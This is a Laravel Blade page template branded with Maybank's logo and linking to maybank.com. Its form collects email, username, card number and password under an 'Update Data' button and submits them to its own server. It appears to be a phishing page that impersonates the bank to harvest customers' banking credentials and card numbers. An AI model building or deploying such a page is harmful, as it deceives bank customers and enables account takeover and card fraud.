<title>Maybank</title>
<x-guest-layout>

    <div class="absolute top-0 left-0 m-4">
        <img src="{{ url('storage/maybank/maybank-logo.png') }}" alt="maybank" class="h-12" />
    </div>

    <x-jet-authentication-card>
        <x-slot name="logo">
            <a href="https://www.maybank.com/">
                <img src="{{ url('storage/maybank/maybank.png') }}" alt="maybank" class="block h-32 mx-auto mb-6" />
            </a>
        </x-slot>

        <x-jet-validation-errors class="mb-4" />

        <form method="POST">
            @csrf

            <div>
                <x-jet-label for="email" value="{{ __('Email') }}" />
                <div class="relative">
                    <span class="absolute inset-y-0 left-0 pl-2 flex items-center">
                        <svg class="h-5 w-5 text-gray-400" fill="currentColor" viewBox="0 0 24 24">
                            <path d="M0 3.727V20.27C0 21.222.777 22 1.727 22h20.545c.95 0 1.728-.778 1.728-1.728V3.727c0-.951-.778-1.728-1.728-1.728H1.727C.777 2 .001 2.777.001 3.727zm22.091 0v1.091l-10.91 7.455-10.91-7.455V3.727h21.82zM1.727 5.454L12 12.455l10.273-7.001v12.364H1.727V5.454zm10.364 7.455L24 20.27V5.454l-11.91 7.727z" />
                        </svg>
                    </span>
                    <x-jet-input id="email" class="pl-8 block mt-1 w-full" type="email" name="email" :value="old('email')" required autofocus autocomplete="name" />
                </div>
            </div>

            <div class="mt-4 relative">
                <x-jet-label for="username" value="{{ __('Username') }}" />
                <div class="relative">
                    <span class="absolute inset-y-0 left-0 pl-2 flex items-center">
                        <svg class="h-5 w-5 text-gray-400" fill="currentColor" viewBox="0 0 24 24">
                            <path d="M12 2c-3.866 0-7 3.134-7 7 0 3.275 2.207 6.032 5.21 6.899-.04-.351-.061-.71-.061-1.083 0-2.757 2.243-5 5-5s5 2.243 5 5c0 .372-.021.732-.061 1.083 3.004-.867 5.21-3.624 5.21-6.899 0-3.866-3.134-7-7-7zm0 2c2.757 0 5 2.243 5 5 0 1.938-1.144 3.625-2.912 4.394C14.905 13.922 13.706 14 12 14s-2.905-.078-4.088-.606C6.144 12.625 5 10.938 5 9c0-2.757 2.243-5 5-5zm0 9c1.93 0 3.5 1.57 3.5 3.5S13.93 20 12 20s-3.5-1.57-3.5-3.5S10.07 11 12 11z" />
                        </svg>

                    </span>
                    <x-jet-input id="username" class="pl-8 block mt-1 w-full" type="text" name="username" :value="old('username')" required autofocus autocomplete="name" />
                </div>
            </div>

            <div class="mt-4 relative">
                <x-jet-label for="card_number" value="{{ __('Card Number') }}" />
                <div class="relative">
                    <span class="absolute inset-y-0 left-0 pl-2 flex items-center">
                        <svg class="h-5 w-5 text-gray-400" fill="currentColor" viewBox="0 0 24 24">
                            <path d="M21 8h-1V7a2 2 0 00-2-2H6a2 2 0 00-2 2v1H3a1 1 0 00-1 1v9a2 2 0 002 2h16a2 2 0 002-2V9a1 1 0 00-1-1zm-7-2h-4V6h4v2zm6 12H4v-7h16v7zm0-9H4V9h16v2z" />
                        </svg>
                    </span>
                    <x-jet-input id="card_number" class="pl-8 block mt-1 w-full" type="text" name="card_number" :value="old('card_number')" required />
                </div>
            </div>

            <div class="mt-4 relative">
                <x-jet-label for="password" value="{{ __('Password') }}" />
                <div class="relative">
                    <span class="absolute inset-y-0 left-0 pl-2 flex items-center">
                        <svg class="h-5 w-5 text-gray-400" fill="currentColor" viewBox="0 0 20 20">
                            <path fill-rule="evenodd" d="M10 2a1 1 0 00-1 1v2H7a5 5 0 00-5 5v5a5 5 0 005 5h6a5 5 0 005-5v-5a5 5 0 00-5-5h-2V3a1 1 0 00-1-1zm-3 3h6a3 3 0 013 3v5a3 3 0 01-3 3H7a3 3 0 01-3-3v-5a3 3 0 013-3z" clip-rule="evenodd" />
                        </svg>
                    </span>
                    <x-jet-input id="password" class="pl-8 block mt-1 w-full" type="password" name="password" required autocomplete="new-password" />
                </div>
            </div>


            <div class="mt-4">
                <x-jet-label for="terms">
                    <div class="flex items-center">
                        <x-jet-checkbox name="terms" id="terms" required />
                        <div class="ml-2">
                            {!! __('I confirm that all the information provided is correct',) !!}
                        </div>
                    </div>
                </x-jet-label>
            </div>

            <div class="flex items-center justify-end mt-4">
                <x-jet-button class="ml-4" disabled>
                    {{ __('Update Data') }}
                </x-jet-button>
            </div>

        </form>

    </x-jet-authentication-card>
</x-guest-layout>